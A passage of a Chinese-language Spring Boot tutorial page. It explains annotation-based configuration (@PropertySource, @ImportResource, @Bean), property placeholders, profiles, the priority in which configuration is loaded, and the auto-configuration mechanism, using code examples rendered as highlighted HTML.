class="comment">     * &lt;bean class="Person"&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name="lastName" value="字面量/$&#123;key&#125;从环境变量、配置文件中获取值/#&#123;SpEL&#125;"&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastName必须是邮箱格式</span></span><br><span class="line">    <span class="meta">@Email</span></span><br><span class="line">    <span class="comment">//@Value("$&#123;person.last-name&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value("#&#123;11*2&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value("true")</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure><h4><span id="4-propertysourceampimportresourceampbean">4、@PropertySource&amp;@ImportResource&amp;@Bean</span></h4><p>@<strong>PropertySource</strong>：加载指定的配置文件；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将配置文件中配置的每一个属性的值，映射到这个组件中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；</span></span><br><span class="line"><span class="comment"> *      prefix = "person"：配置文件中哪个下面的所有属性进行一一映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 只有这个组件是容器中的组件，才能容器提供的<span class="doctag">@ConfigurationProperties</span>功能；</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@ConfigurationProperties</span>(prefix = "person")默认从全局配置文件中获取值；</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PropertySource</span>(value = &#123;<span class="string">"classpath:person.properties"</span>&#125;)</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"person"</span>)</span><br><span class="line"><span class="comment">//@Validated</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;bean class="Person"&gt;</span></span><br><span class="line"><span class="comment">     *      &lt;property name="lastName" value="字面量/$&#123;key&#125;从环境变量、配置文件中获取值/#&#123;SpEL&#125;"&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">     * &lt;bean/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//lastName必须是邮箱格式</span></span><br><span class="line">   <span class="comment">// @Email</span></span><br><span class="line">    <span class="comment">//@Value("$&#123;person.last-name&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="comment">//@Value("#&#123;11*2&#125;")</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="comment">//@Value("true")</span></span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br></pre></td></tr></table></figure><p>@<strong>ImportResource</strong>：导入Spring的配置文件，让配置文件里面的内容生效；</p><p>Spring Boot里面没有Spring的配置文件，我们自己编写的配置文件，也不能自动识别；</p><p>想让Spring的配置文件生效，加载进来；@<strong>ImportResource</strong>标注在一个配置类上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ImportResource</span>(locations = &#123;<span class="string">"classpath:beans.xml"</span>&#125;)</span><br><span class="line">导入Spring的配置文件让其生效</span><br></pre></td></tr></table></figure><p>不来编写Spring的配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloService"</span> <span class="attr">class</span>=<span class="string">"com.atguigu.springboot.service.HelloService"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBoot推荐给容器中添加组件的方式；推荐使用全注解的方式</p><p>1、配置类<strong>@Configuration</strong>——&gt;Spring配置文件</p><p>2、使用<strong>@Bean</strong>给容器中添加组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Configuration</span>：指明当前类是一个配置类；就是来替代之前的Spring配置文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 在配置文件中用&lt;bean&gt;&lt;bean/&gt;标签添加组件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAppConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将方法的返回值添加到容器中；容器中这个组件默认的id就是方法名</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HelloService <span class="title">helloService02</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"配置类@Bean给容器中添加组件了..."</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelloService();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>##4、配置文件占位符</p><h3><span id="1-随机数">1、随机数</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;random.value&#125;、$&#123;random.<span class="keyword">int</span>&#125;、$&#123;random.<span class="keyword">long</span>&#125;</span><br><span class="line">$&#123;random.<span class="keyword">int</span>(<span class="number">10</span>)&#125;、$&#123;random.<span class="keyword">int</span>[<span class="number">1024</span>,<span class="number">65536</span>]&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-占位符获取之前配置的值如果没有可以是用指定默认值">2、占位符获取之前配置的值，如果没有可以是用:指定默认值</span></h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">person.last-name</span>=<span class="string">张三$&#123;random.uuid&#125;</span></span><br><span class="line"><span class="meta">person.age</span>=<span class="string">$&#123;random.int&#125;</span></span><br><span class="line"><span class="meta">person.birth</span>=<span class="string">2017/12/15</span></span><br><span class="line"><span class="meta">person.boss</span>=<span class="string">false</span></span><br><span class="line"><span class="meta">person.maps.k1</span>=<span class="string">v1</span></span><br><span class="line"><span class="meta">person.maps.k2</span>=<span class="string">14</span></span><br><span class="line"><span class="meta">person.lists</span>=<span class="string">a,b,c</span></span><br><span class="line"><span class="meta">person.dog.name</span>=<span class="string">$&#123;person.hello:hello&#125;_dog</span></span><br><span class="line"><span class="meta">person.dog.age</span>=<span class="string">15</span></span><br></pre></td></tr></table></figure><h2><span id="5-profile">5、Profile</span></h2><h3><span id="1-多profile文件">1、多Profile文件</span></h3><p>我们在主配置文件编写的时候，文件名可以是   application-{profile}.properties/yml</p><p>默认使用application.properties的配置；</p><h3><span id="2-yml支持多文档块方式">2、yml支持多文档块方式</span></h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">prod</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8083</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8084</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">prod</span>  <span class="comment">#指定属于哪个环境</span></span><br></pre></td></tr></table></figure><h3><span id="3-激活指定profile">3、激活指定profile</span></h3><p>​    1、在配置文件中指定  spring.profiles.active=dev</p><p>​    2、命令行：</p><p>​        java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar –spring.profiles.active=dev；</p><p>​        可以直接在测试的时候，配置传入命令行参数</p><p>​    3、虚拟机参数；</p><p>​        -Dspring.profiles.active=dev</p><h2><span id="6-配置文件加载位置">6、配置文件加载位置</span></h2><p>springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件</p><p>–file:./config/</p><p>–file:./</p><p>–classpath:/config/</p><p>–classpath:/</p><p>优先级由高到底，高优先级的配置会覆盖低优先级的配置；</p><p>SpringBoot会从这四个位置全部加载主配置文件；<strong>互补配置</strong>；</p><p>==我们还可以通过spring.config.location来改变默认的配置文件位置==</p><p><strong>项目打包好以后，我们可以使用命令行参数的形式，启动项目的时候来指定配置文件的新位置；指定配置文件和默认加载的这些配置文件共同起作用形成互补配置；</strong></p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar –spring.config.location=G:/application.properties</p><h2><span id="7-外部配置加载顺序">7、外部配置加载顺序</span></h2><p><strong>==SpringBoot也可以从以下位置加载配置； 优先级从高到低；高优先级的配置覆盖低优先级的配置，所有的配置会形成互补配置==</strong></p><p><strong>1.命令行参数</strong></p><p>所有的配置都可以在命令行上进行指定</p><p>java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar –server.port=8087  –server.context-path=/abc</p><p>多个配置用空格分开； –配置项=值</p><p>2.来自java:comp/env的JNDI属性</p><p>3.Java系统属性（System.getProperties()）</p><p>4.操作系统环境变量</p><p>5.RandomValuePropertySource配置的random.*属性值</p><p>==<strong>由jar包外向jar包内进行寻找；</strong>==</p><p>==<strong>优先加载带profile</strong>==</p><p><strong>6.jar包外部的application-{profile}.properties或application.yml(带spring.profile)配置文件</strong></p><p><strong>7.jar包内部的application-{profile}.properties或application.yml(带spring.profile)配置文件</strong></p><p>==<strong>再来加载不带profile</strong>==</p><p><strong>8.jar包外部的application.properties或application.yml(不带spring.profile)配置文件</strong></p><p><strong>9.jar包内部的application.properties或application.yml(不带spring.profile)配置文件</strong></p><p>10.@Configuration注解类上的@PropertySource</p><p>11.通过SpringApplication.setDefaultProperties指定的默认属性</p><p>所有支持的配置加载来源；</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#boot-features-external-config" target="_blank" rel="noopener">参考官方文档</a></p><h2><span id="8-自动配置原理">8、自动配置原理</span></h2><p>配置文件到底能写什么？怎么写？自动配置原理；</p><p><a href="https://docs.spring.io/spring-boot/docs/1.5.9.RELEASE/reference/htmlsingle/#common-application-properties" target="_blank" rel="noopener">配置文件能配置的属性参照</a></p><h3><span id="1-自动配置原理">1、<strong>自动配置原理：</strong></span></h3><p>1）、SpringBoot启动的时候加载主配置类，开启了自动配置功能 ==@EnableAutoConfiguration==</p><p><strong>2）、@EnableAutoConfiguration 作用：</strong></p><ul><li>利用EnableAutoConfigurationImportSelector给容器中导入一些组件？</li></ul><ul><li><p>可以查看selectImports()方法的内容；</p></li><li><p>List<string> configurations = getCandidateConfigurations(annotationMetadata,      attributes);获取候选的配置</string></p><ul><li><pre><code class="java">SpringFactoriesLoader.loadFactoryNames()扫描所有jar包类路径下  META-INF/spring.factories把扫描到的这些文件的内容包装成properties对象从properties中获取到EnableAutoConfiguration<span class="class">.<span class="keyword">class</span>类（类名）对应的值，然后把他们添加在容器中</span><span class="class"></span><span class="class"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">**&#x3D;&#x3D;将 类路径下  META-INF&#x2F;spring.factories 里面配置的所有EnableAutoConfiguration的值加入到了容器中；&#x3D;&#x3D;**</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;properties</span><br><span class="line"># Auto Configure</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration&#x3D;\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.DeviceDelegatingViewResolverAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mobile.SitePreferenceAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.reactor.ReactorAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.SecurityFilterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.FallbackWebSecurityAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.SocialWebAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.FacebookAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.LinkedInAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.social.TwitterAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.DispatcherServletAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpEncodingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.HttpMessageConvertersAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.MultipartAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.ServerPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebClientAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.websocket.WebSocketMessagingAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration</span><br></pre></td></tr></table></figure></span><span class="class"></span></code></pre></li></ul></li></ul><p>每一个这样的  xxxAutoConfiguration类都是容器中的一个组件，都加入到容器中；用他们来做自动配置；</p><p>3）、每一个自动配置类进行自动配置功能；</p><p>4）、以<strong>HttpEncodingAutoConfiguration（Http编码自动配置）</strong>为例解释自动配置原理；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>   <span class="comment">//表示这是一个配置类，以前编写的配置文件一样，也可以给容器中添加组件</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span>(HttpEncodingProperties<span class="class">.<span class="keyword">class</span>)  //启动指定类的<span class="title">ConfigurationProperties</span>功能；将配置文件中对应的值和<span class="title">HttpEncodingProperties</span>绑定起来；并把<span class="title">HttpEncodingProperties</span>加入到<span class="title">ioc</span>容器中</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnWebApplication</span> //<span class="title">Spring</span>底层@<span class="title">Conditional</span>注解（<span class="title">Spring</span>注解版），根据不同的条件，如果满足指定的条件，整个配置类里面的配置就会生效；    判断当前应用是否是<span class="title">web</span>应用，如果是，当前配置类生效</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnClass</span>(<span class="title">CharacterEncodingFilter</span>.<span class="title">class</span>)  //判断当前项目有没有这个类<span class="title">CharacterEncodingFilter</span>；<span class="title">SpringMVC</span>中进行乱码解决的过滤器；</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnProperty</span>(<span class="title">prefix</span> </span>= <span class="string">"spring.http.encoding"</span>, value = <span class="string">"enabled"</span>, matchIfMissing = <span class="keyword">true</span>)  <span class="comment">//判断配置文件中是否存在某个配置  spring.http.encoding.enabled；如果不存在，判断也是成立的</span></span><br><span class="line"><span class="comment">//即使我们配置文件中不配置pring.http.encoding.enabled=true，也是默认生效的；</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpEncodingAutoConfiguration</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//他已经和SpringBoot的配置文件映射了</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> HttpEncodingProperties properties;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">//只有一个有参构造器的情况下，参数的值就会从容器中拿</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HttpEncodingAutoConfiguration</span><span class="params">(HttpEncodingProperties properties)</span> </span>&#123;</span><br><span class="line"><span 